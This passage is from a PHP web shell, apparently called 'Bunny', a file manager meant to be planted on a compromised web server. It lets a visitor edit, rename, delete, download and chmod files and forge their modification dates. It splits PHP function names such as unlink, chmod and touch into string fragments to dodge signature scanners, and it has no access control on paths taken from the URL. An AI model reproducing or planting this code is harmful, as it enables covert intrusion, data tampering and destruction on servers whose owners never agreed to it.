                return;
            }
            if (e.shiftKey && (e.key === "Delete" || e.key === "Backspace")) {

                e.preventDefault();
                let startPos = this.value.substring(0, this.selectionStart).split("\n").length - 1;
                let endPos = this.value.substring(0, this.selectionEnd).split("\n").length - 1;
                let cursorLine = this.value.substring(0, this.selectionStart).split("\n").pop();
                let cursorPosInLine = cursorLine.length;
                let totalLinesRemove = endPos - startPos + 1;
                let lines = this.value.split("\n");
                let newStart = lines.slice(0, startPos).join("\n").length + (startPos > 0 ? 1 : 0);
                lines.splice(startPos, totalLinesRemove);
                let newLine = lines[startPos] || "";
                if (newLine.length < cursorPosInLine) {
                    cursorPosInLine = newLine.length;
                }
                newStart += cursorPosInLine;

                this.value = lines.join("\n");
                this.selectionStart = this.selectionEnd = newStart; 
                updateCode();
                return;
            }

            if (e.key === "Home") {
                let line = this.value.substring(0, this.selectionStart).split("\n").pop();
                let cursorPosInLine = line.length;
                let lineStartPos = this.value.substring(0, this.selectionStart).lastIndexOf("\n") + 1;
                let firstNonWhitespacePos = line.search(/\S/);
                if (firstNonWhitespacePos >= cursorPosInLine) {
                    return true;
                }
                else if (firstNonWhitespacePos === -1) {
                    return true;
                }
                e.preventDefault();
                this.selectionStart = this.selectionEnd = lineStartPos + firstNonWhitespacePos;
                return;
            }
        });

        document.getElementById("selectStyle").addEventListener("change", (e) => {
            document.getElementById("theme1").href = `https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/${e.target.value}`;
        });

        function updateFont() {
            let selectFont = document.getElementById("selectFont");
            let fontName = selectFont.options[selectFont.selectedIndex].text;
            let fontNameUrl = fontName.replace(" ", "+");
            let inputFontSize = document.getElementById("inputFontSize");
            document.getElementById("style2").textContent = `
            @import url("https://fonts.googleapis.com/css2?&display=swap&family=${fontNameUrl}");
            pre, code, textarea {
                font-family: "${fontName}", monospace !important;
                font-size: ${inputFontSize.value}pt !important;
            }`;
        }

        document.getElementById("selectLanguage").addEventListener("change", function () {
            document.getElementById("codeBlock").className = this.value;
            highlightJS();
        });

        document.getElementById("inputFontSize").addEventListener("input", () => { updateFont(); });

        document.getElementById("selectFont").addEventListener("change", () => { updateFont(); });
        </script>
        ';
        echo '<button type="button" onclick="history.back()" class="inline-flex items-center mt-2 mx-2 px-5 py-2.5 text-sm font-medium text-center text-white bg-pink-700 rounded-lg focus:ring-4 focus:ring-pink-200 dark:focus:ring-pink-900 hover:bg-pink-800">Back</button>';
        echo '<button type="submit" name="btn-editedfile" class="inline-flex items-center mt-2 mx-2 px-5 py-2.5 text-sm font-medium text-center text-white bg-blue-700 rounded-lg focus:ring-4 focus:ring-blue-200 dark:focus:ring-blue-900 hover:bg-blue-800">Save</button>';
        echo '</form>';
    }

    if (isset($_GET['rename'])) {
        $SiBunny = 'h' . 'tm' . 'lspe' . 'cialc' . 'hars';
        if (isset($_POST['btn-rename'])) {
            $rnm = 'r' . 'e' . 'n' . 'a' . 'm' . 'e';
            if ($rnm($_GET['rename'], $path . '/' . $SiBunny($_POST['newname']))) {
                echo '
                <script>
                    alert("Rename Success")
                    history.back()
                    history.back()
                </script>';
            } else {
                echo '
                <script>
                    alert("Rename Failed!")
                    history.back()
                </script>
                ';
            }
            $_GET['rename'] = $SiBunny($_POST['newname']);
        }
        echo '<form class="mx-2 my-2" action="" method="POST">';
        echo '<label class="block">
                <span class="block ' . $txtBlue . '">RENAME => ' . $path . '/' . $_GET["rename"] . '</span>
                <input type="text" class="bg-white ' . $txtBlack . ' tracking-wider font-bold w-auto border border-slate-300 rounded-md py-2 pl-4 shadow-sm" name="newname" value="' . $_GET["rename"] . '">
                </label>';
        echo '<button type="button" onclick="history.back()" class="inline-flex items-center mt-2 mx-2 px-5 py-2.5 text-sm font-medium text-center text-white bg-pink-700 rounded-lg focus:ring-4 focus:ring-pink-200 dark:focus:ring-pink-900 hover:bg-pink-800">Back</button>';
        echo '<button type="submit" name="btn-rename" class="inline-flex items-center mt-2 mx-2 px-5 py-2.5 text-sm font-medium text-center text-white bg-blue-700 rounded-lg focus:ring-4 focus:ring-blue-200 dark:focus:ring-blue-900 hover:bg-blue-800">Save</button>';
        echo '</form>';
    }

    if (isset($_GET['permission'])) {
        $SiBunny = 'h' . 'tm' . 'lspe' . 'cialc' . 'hars';
        $value = $path . '/' . $_GET['permission'];
        if (isset($_POST['btn-permission'])) {
            $newperms = $SiBunny($_POST['newperms']);
            $chperms = 'c' . 'h' . 'm' . 'o' . 'd';
            $oct = 'o' . 'c' . 't' . 'd' . 'e' . 'c';
            if ($chperms($value, $oct($newperms))) {
                echo '<script>alert("Change Permission Success");</script>';
            } else {
                echo '<script>alert("Change Permission Failed!");</script>';
            }
        }
        echo '<form class="mx-2 my-2" action="" method="POST">';
        echo '<label class="block">
                <span class="block ' . $txtGreen . '">CHANGE PERMISSION => ' . $path . '/' . $_GET["permission"] . '</span>
                <input type="number" class="bg-white ' . $txtBlack . ' tracking-wider font-bold w-auto border border-slate-300 rounded-md py-2 pl-4 shadow-sm placeholder:text-gray-500" name="newperms" placeholder="' . chPerms($value) . '">
              </label>';
        echo '<button type="button" onclick="history.back()" class="inline-flex items-center mt-2 mx-2 px-5 py-2.5 text-sm font-medium text-center text-white bg-pink-700 rounded-lg focus:ring-4 focus:ring-pink-200 dark:focus:ring-pink-900 hover:bg-pink-800">Back</button>';
        echo '<button type="submit" name="btn-permission" class="inline-flex items-center mt-2 mx-2 px-5 py-2.5 text-sm font-medium text-center text-white bg-blue-700 rounded-lg focus:ring-4 focus:ring-blue-200 dark:focus:ring-blue-900 hover:bg-blue-800">Save</button>';
        echo '</form>';
    }

    if (isset($_GET['changedate'])) {
        $SiBunny = 'h' . 'tm' . 'lspe' . 'cialc' . 'hars';
        $f_time = 'f' . 'il' . 'e' . 'm' . 't' . 'im' . 'e';
        $str_time = 's' . 'tr' . 'to' . 'ti' . 'me';
        $tch = 'to' . 'uc' . 'h';
        $value = $_GET['changedate'];
        $this_date = date("d-M-Y H:i", $f_time($value));
        if (isset($_POST['btn-date'])) {
            $newDate = $SiBunny($_POST['newdate']);
            if ($str_time($newDate) !== false) {
                if ($tch($value, $str_time($newDate))) {
                    echo '
                    <script>
                        alert("Change Date Success")
                        history.back()
                        history.back()
                    </script>';
                } else {
                    echo '
                    <script>
                        alert("Failed to Change Date!")
                        history.back()
                    </script>';
                }
            } else {
                echo '
                <script>
                    alert("Invalid Date Format!")
                    history.back()
                </script>';
            }
        }
        echo '<form class="mx-2 my-2" action="" method="POST">';
        echo '<label class="block">
            <span class="block ' . $txtBlue . '">CHANGE DATE => ' . $path . '/' . $value . '</span>
            <input type="text" class="bg-white ' . $txtBlack . ' tracking-wider font-bold w-auto border border-slate-300 rounded-md py-2 pl-4 shadow-sm" name="newdate" value="' . $this_date . '">
            </label>';
        echo '<button type="button" onclick="history.back()" class="inline-flex items-center mt-2 mx-2 px-5 py-2.5 text-sm font-medium text-center text-white bg-pink-700 rounded-lg focus:ring-4 focus:ring-pink-200 dark:focus:ring-pink-900 hover:bg-pink-800">Back</button>';
        echo '<button type="submit" name="btn-date" class="inline-flex items-center mt-2 mx-2 px-5 py-2.5 text-sm font-medium text-center text-white bg-blue-700 rounded-lg focus:ring-4 focus:ring-blue-200 dark:focus:ring-blue-900 hover:bg-blue-800">Save</button>';
        echo '</form>';
    }

    if (isset($_GET['deletedir'])) {
        function deleteDir($dirName)
        {
            $f_exist = 'fi' . 'le_' . 'exis' . 'ts';
            $glb = 'g' . 'l' . 'o' . 'b';
            $is_d = 'is' . '_' . 'd' . 'i' . 'r';
            $unl = 'u' . 'n' . 'l' . 'i' . 'n' . 'k';
            $rm_d = 'r' . 'm' . 'd' . 'i' . 'r';
            if (!$f_exist($dirName)) {
                return false;
            }
            $files = $glb($dirName . '/*');
            foreach ($files as $file) {
                $is_d($file) ? deleteDir($file) : $unl($file);
            }
            $rm_d($dirName);
            return true;
        }
        $dirName = $_GET['deletedir'];
        if (deleteDir($dirName)) {
            echo '
            <script>
                alert("Delete Dir Success")
                history.back()
                history.back()
            </script>';
        } else {
            echo '
            <script>
                alert("Delete Dir Failed!")
                history.back()
            </script>
            ';
        }
    }

    if (isset($_GET['deletefile'])) {
        $unl = 'u' . 'n' . 'l' . 'i' . 'n' . 'k';
        if ($unl($_GET['deletefile'])) {
            echo '
            <script>
                alert("Delete File Success")
                history.back()
                history.back()
            </script>';
        } else {
            echo '
            <script>
                alert("Delete File Failed!")
                history.back()
            </script>
            ';
        }
    }
    ?>
    <div class="container px-2 py-2 w-full">
        <?php
        $scn_d = 'sc' . 'an' . 'd' . 'ir';
        $scan = $scn_d($path);
        ?>
        <table
            class="border-separate border-spacing-2 border border-slate-500 whitespace-nowrap w-full table-auto md:table-auto">
            <thead>
                <tr>
                    <th class="border border-slate-600 <?= $txtWhite ?>">Name</th>
                    <th class="border border-slate-600 <?= $txtWhite ?>">Last Modified</th>
                    <th class="border border-slate-600 <?= $txtWhite ?>">Size</th>
                    <th class="border border-slate-600 <?= $txtWhite ?>">Owner/Group</th>
                    <th class="border border-slate-600 <?= $txtWhite ?>">Permission</th>
                    <th class="border border-slate-600 <?= $txtWhite ?>">Actions</th>
                </tr>
            </thead>
            <tbody>
                <?php
                echo "<tr><td class='whitespace-nowrap flex flex-row " . $txtOrange . "'><img src='" . $folderIcon . "'>&nbsp;<a class='font-bold " . $txtOrange . "' href='?path=" . $path . "'>.</a></td>";
                echo "<td class='whitespace-nowrap w-auto px-12 " . $txtSky . "'><center>--</center></td>";
                echo "<td class='whitespace-nowrap " . $txtRose . "'><center>--DIR--</center></td>";
                echo "<td class='whitespace-nowrap " . $txtEmerald . "'><center>--</center></td>";
                echo "<td class='whitespace-nowrap'><center><a href='?option&path=" . $path . "&permission=" . $dir . "'>";
                $is_w = 'is' . '_' . 'wr' . 'it' . 'ab' . 'le';
                $is_r = 'is' . '_' . 're' . 'ad' . 'ab' . 'le';
                if ($is_w("$path/$dir"))
                    echo '<center><font class="' . $txtGreen . '">';
                elseif (!$is_r("$path/$dir"))
                    echo '<font class="' . $txtRed . '">';
                echo perms("$path/$dir");

                if ($is_w("$path/$dir") || !$is_r("$path/$dir"))
                    echo '</font></a></center></td>';
                echo "<td><center>"; ?>
                <a href="?option&path=<?= $path ?>&newfolder"><button type="button" name="newfolder" class="inline-flex items-center px-2 py-2 mx-2 font-bold text-center <?= $txtWhite ?> hover:text-black border rounded-lg focus:ring-4 focus:ring-amber-200 dark:focus:ring-amber-500 hover:bg-amber-500"><i class="fa-duotone fa-folder-plus"></i></button>
                    <a href="?option&path=<?= $path ?>&newfiles"><button type="button" name="newfiles" class="inline-flex items-center px-2 py-2 mx-2 font-bold text-center <?= $txtWhite ?> hover:text-black border rounded-lg focus:ring-4 focus:ring-neutral-200 dark:focus:ring-neutral-400 hover:bg-neutral-400"><i class="fa-duotone fa-file-plus"></i></button>
                        <?php
                        echo "</center></td></tr>";
                        $d_name = 'di' . 'rn' . 'am' . 'e';
                        echo "<tr><td class='whitespace-nowrap flex flex-row " . $txtOrange . "'><img src='" . $folderIcon . "'>&nbsp;<a class='font-bold " . $txtOrange . "' href='?path=" . $d_name($path) . "'>..</a></td>";
                        echo "<td class='whitespace-nowrap w-auto px-12 " . $txtSky . "'><center>--</center></td>";
                        echo "<td class='whitespace-nowrap " . $txtRose . "'><center>--DIR--</center></td>";
                        echo "<td class='whitespace-nowrap " . $txtEmerald . "'><center>--</center></td>";
                        echo "<td class='whitespace-nowrap'><center><a href='?option&path=" . $path . "&permission=" . $dir . "'>";
                        $is_w = 'is' . '_' . 'wr' . 'it' . 'ab' . 'le';
                        $is_r = 'is' . '_' . 're' . 'ad' . 'ab' . 'le';
                        if ($is_w("$path/$dir"))
                            echo '<center><font class="' . $txtGreen . '">';
                        elseif (!$is_r("$path/$dir"))
                            echo '<font class="' . $txtRed . '">';
                        echo perms("$path/$dir");

                        if ($is_w("$path/$dir") || !$is_r("$path/$dir"))
                            echo '</font></a></center></td>';
                        echo "<td><center>"; ?>
                        <a href="?option&path=<?= $path ?>&newfolder"><button type="button" name="newfolder" class="inline-flex items-center px-2 py-2 mx-2 font-bold text-center <?= $txtWhite ?> hover:text-black border rounded-lg focus:ring-4 focus:ring-amber-200 dark:focus:ring-amber-500 hover:bg-amber-500"><i class="fa-duotone fa-folder-plus"></i></button>
                            <a href="?option&path=<?= $path ?>&newfiles"><button type="button" name="newfiles" class="inline-flex items-center px-2 py-2 mx-2 font-bold text-center <?= $txtWhite ?> hover:text-black border rounded-lg focus:ring-4 focus:ring-neutral-200 dark:focus:ring-neutral-400 hover:bg-neutral-400"><i class="fa-duotone fa-file-plus"></i></button>
                                <?php
                                echo "</center></td></tr>";
                                foreach ($scan as $dir) {
                                    if (!is_dir("$path/$dir") || $dir == '.' || $dir == '..')
                                        continue;

                                    $func_exist = 'fu' . 'nct' . 'ion' . '_' . 'ex' . 'ist' . 's';
                                    $psx_euid = 'p' . 'os' . 'ix' . '_' . 'ge' . 'te' . 'u' . 'i' . 'd';
                                    $psx_egid = 'p' . 'os' . 'ix' . '_' . 'ge' . 'te' . 'g' . 'i' . 'd';
                                    $psx_usr_uid = 'p' . 'os' . 'ix' . '_' . 'g' . 'et' . 'pw' . 'u' . 'i' . 'd';
                                    $psx_grp_gid = 'p' . 'os' . 'ix' . '_' . 'ge' . 'tg' . 'rg' . 'i' . 'd';
                                    $myuid = 'g' . 'et' . 'my' . 'ui' . 'd';
                                    $mygid = 'g' . 'et' . 'my' . 'gi' . 'd';
                                    $cur_usr = 'g' . 'et' . '_' . 'cu' . 'rr' . 'en' . 't' . '_' . 'us' . 'er';
                                    $own_f = 'fi' . 'le' . 'ow' . 'n' . 'er';
                                    $grp_f = 'fi' . 'le' . 'gr' . 'ou' . 'p';
                                    if (!$func_exist($psx_egid)) {
                                        $d_user = $func_exist($own_f) ? @$own_f("$path/$dir") : "????";
                                        $d_group = $func_exist($grp_f) ? @$grp_f("$path/$dir") : "????";
                                    } else {
                                        $uid = $func_exist($psx_usr_uid) && $func_exist($psx_euid) ? @$own_f("$path/$dir") : array("name" => "????");
                                        $gid = $func_exist($psx_grp_gid) && $func_exist($psx_egid) ? @$grp_f("$path/$dir") : array("name" => "????");
                                        $d_user = $uid['name'] ? $uid['name'] : ($func_exist($own_f) ? @$own_f("$path/$dir") : "????");
                                        $d_group = $gid['name'] ? $gid['name'] : ($func_exist($grp_f) ? @$grp_f("$path/$dir") : "????");
                                    }
                                    echo "<tr>";
                                    echo "<td class='whitespace-nowrap flex flex-row " . $txtOrange . "'><img src='" . $folderIcon . "'>&nbsp;<a class='font-bold " . $txtOrange . "' href='?path=" . $path . '/' . $dir . "'>$dir</a></td>";
                                    echo "<td class='whitespace-nowrap w-auto px-12 " . $txtSky . "'><center><a href='?option&path=" . $path . "&changedate=" . $dir . "'>" . date("d-M-Y H:i", filemtime("$path/$dir")) . "</a></center></td>";
                                    echo "<td class='whitespace-nowrap " . $txtRose . "'><center>--DIR--</center></td>";
                                    echo "<td class='whitespace-nowrap " . $txtEmerald . "'><center>" . $d_user . "/" . $d_group . "</center></td>";
                                    echo "<td class='whitespace-nowrap'><center><a href='?option&path=" . $path . "&permission=" . $dir . "'>";
                                    $is_w = 'is' . '_' . 'wr' . 'it' . 'ab' . 'le';
                                    $is_r = 'is' . '_' . 're' . 'ad' . 'ab' . 'le';
                                    if ($is_w("$path/$dir"))
                                        echo '<center><font class="' . $txtGreen . '">';
                                    elseif (!$is_r("$path/$dir"))
                                        echo '<font class="' . $txtRed . '">';
                                    echo perms("$path/$dir");

                                    if ($is_w("$path/$dir") || !$is_r("$path/$dir"))
                                        echo '</font></a></center></td>';
                                    echo "<td><center>";
                                ?>
                                    <div class="flex justify-center items-center flex-row flex-nowrap whitespace-nowrap">
                                        <a href="?option&path=<?= $path ?>&rename=<?= $dir ?>"><button type="button" class="inline-flex items-center px-2 py-2 mx-2 text-sm font-medium text-center text-white border rounded-lg focus:ring-4 focus:ring-sky-200 dark:focus:ring-sky-900 hover:bg-sky-800"><i class="fa-sharp fa-regular fa-pencil"></i></button></a>
                                        <a href="?option&path=<?= $path ?>&permission=<?= $dir ?>"><button type="button" class="inline-flex items-center px-2 py-2 mx-2 text-sm font-medium text-center text-white border rounded-lg focus:ring-4 focus:ring-yellow-300 dark:focus:ring-yellow-700 hover:bg-yellow-600"><i class="fa-regular fa-user-pen"></i></button></a>
                                        <a href="?option&path=<?= $path ?>&deletedir=<?= $dir ?>"><button type="button" class="inline-flex items-center px-2 py-2 mx-2 text-sm font-medium text-center text-white border rounded-lg focus:ring-4 focus:ring-red-200 dark:focus:ring-red-900 hover:bg-red-800"><i class="fa-regular fa-trash-can-xmark"></i></button></a>
                                    </div>
                                <?php
                                    echo "</center></td></tr>";
                                }
                                foreach ($scan as $file) {
                                    $is_f = 'is' . '_' . 'f' . 'il' . 'e';
                                    $f_sz = 'f' . 'il' . 'es' . 'iz' . 'e';
                                    $rnd = 'ro' . 'un' . 'd';
                                    $f_time = 'fi' . 'l' . 'em' . 'ti' . 'm' . 'e';
                                    if (!$is_f("$path/$file"))
                                        continue;
                                    $size = $f_sz("$path/$file") / 1024;
                                    $size = $rnd($size, 3);
                                    if ($size >= 1024) {
                                        $size = $rnd($size / 1024, 2) . ' MB';
                                    } else {
                                        $size = $size . ' KB';
                                    }
                                    $func_exist = 'fu' . 'nct' . 'ion' . '_' . 'ex' . 'ist' . 's';
                                    $psx_euid = 'p' . 'os' . 'ix' . '_' . 'ge' . 'te' . 'u' . 'i' . 'd';
                                    $psx_egid = 'p' . 'os' . 'ix' . '_' . 'ge' . 'te' . 'g' . 'i' . 'd';
                                    $psx_usr_uid = 'p' . 'os' . 'ix' . '_' . 'g' . 'et' . 'pw' . 'u' . 'i' . 'd';
                                    $psx_grp_gid = 'p' . 'os' . 'ix' . '_' . 'ge' . 'tg' . 'rg' . 'i' . 'd';
                                    $myuid = 'g' . 'et' . 'my' . 'ui' . 'd';
                                    $mygid = 'g' . 'et' . 'my' . 'gi' . 'd';
                                    $cur_usr = 'g' . 'et' . '_' . 'cu' . 'rr' . 'en' . 't' . '_' . 'us' . 'er';
                                    $own_f = 'fi' . 'le' . 'ow' . 'n' . 'er';
                                    $grp_f = 'fi' . 'le' . 'gr' . 'ou' . 'p';
                                    if (!$func_exist($psx_egid)) {
                                        $f_user = $func_exist($own_f) ? @$own_f("$path/$file") : "????";
                                        $f_group = $func_exist($grp_f) ? @$grp_f("$path/$file") : "????";
                                    } else {
                                        $uid = $func_exist($psx_usr_uid) && $func_exist($psx_euid) ? @$own_f("$path/$file") : array("name" => "????");
                                        $gid = $func_exist($psx_grp_gid) && $func_exist($psx_egid) ? @$grp_f("$path/$file") : array("name" => "????");
                                        $f_user = $uid['name'] ? $uid['name'] : ($func_exist($own_f) ? @$own_f("$path/$file") : "????");
                                        $f_group = $gid['name'] ? $gid['name'] : ($func_exist($grp_f) ? @$grp_f("$path/$file") : "????");
                                    }
                                    echo "<tr>";
                                    echo "<td class='whitespace-nowrap flex flex-row'><img src='" . $filesIcon . "'>&nbsp;<a class=\"$txtWhite\" href=\"?option&path=$path&editfile=$file\">$file</a></td>";
                                    echo "<td class='whitespace-nowrap w-auto px-12 " . $txtSky . "'><center><a href='?option&path=" . $path . "&changedate=" . $file . "'>" . date("d-M-Y H:i", $f_time("$path/$file")) . "</a></center></td>";
                                    echo "<td class='whitespace-nowrap " . $txtRose . "'><center>" . $size . "</center></td>";
                                    echo "<td class='whitespace-nowrap " . $txtEmerald . "'><center>" . $f_user . "/" . $f_group . "</center></td>";
                                    echo "<td class='whitespace-nowrap'><center><a href='?option&path=" . $path . "&permission=" . $file . "'>";
                                    $is_w = 'is' . '_' . 'wr' . 'it' . 'ab' . 'le';
                                    $is_r = 'is' . '_' . 're' . 'ad' . 'ab' . 'le';
                                    if ($is_w("$path/$file"))
                                        echo '<font class="' . $txtGreen . '">';
                                    elseif (!$is_r("$path/$file"))
                                        echo '<font class="' . $txtRed . '">';
                                    echo perms("$path/$file");
                                    if ($is_w("$path/$file") || !$is_r("$path/$file"))
                                        echo '</font></a></center></td>';
                                    echo "<td><center>";
                                ?>
                                    <div class="flex justify-center items-center flex-row flex-nowrap whitespace-nowrap">
                                        <a href="?option&path=<?= $path ?>&editfile=<?= $file ?>"><button type="button" class="inline-flex items-center px-2 py-2 mx-2 text-sm font-medium text-center text-white border rounded-lg focus:ring-4 focus:ring-emerald-200 dark:focus:ring-emerald-900 hover:bg-emerald-800"><i class="fa-sharp fa-regular fa-file-pen"></i></button></a>
                                        <a href="?option&path=<?= $path ?>&rename=<?= $file ?>"><button type="button" class="inline-flex items-center px-2 py-2 mx-2 text-sm font-medium text-center text-white border rounded-lg focus:ring-4 focus:ring-sky-200 dark:focus:ring-sky-900 hover:bg-sky-800"><i class="fa-sharp fa-regular fa-pencil"></i></button></a>
                                        <a href="?option&path=<?= $path ?>&permission=<?= $file ?>"><button type="button" class="inline-flex items-center px-2 py-2 mx-2 text-sm font-medium text-center text-white hover:text-black border rounded-lg focus:ring-4 focus:ring-yellow-300 dark:focus:ring-yellow-700 hover:bg-yellow-600"><i class="fa-regular fa-user-pen"></i></button></a>
                                        <a href="?option&path=<?= $path ?>&downloadfile=<?= $file ?>"><button type="button" class="inline-flex items-center px-2 py-2 mx-2 text-sm font-medium text-center text-white hover:text-black border rounded-lg focus:ring-4 focus:ring-slate-200 dark:focus:ring-slate-900 hover:bg-white"><i class="fa-solid fa-download"></i></button></a>
                                        <a href="?option&path=<?= $path ?>&deletefile=<?= $file ?>"><button type="button" class="inline-flex items-center px-2 py-2 mx-2 text-sm font-medium text-center text-white border rounded-lg focus:ring-4 focus:ring-red-200 dark:focus:ring-red-900 hover:bg-red-800"><i class="fa-regular fa-trash-can-xmark"></i></button></a>
                                    </div>
                                <?php echo "</center></td></tr>";
                                } ?>
            </tbody>
        </table>
    </div>
    <?= $Bunny_Footer ?>

    <!-- Flowbite JS -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/flowbite/1.8.1/flowbite.min.js"></script>
</body>

</html>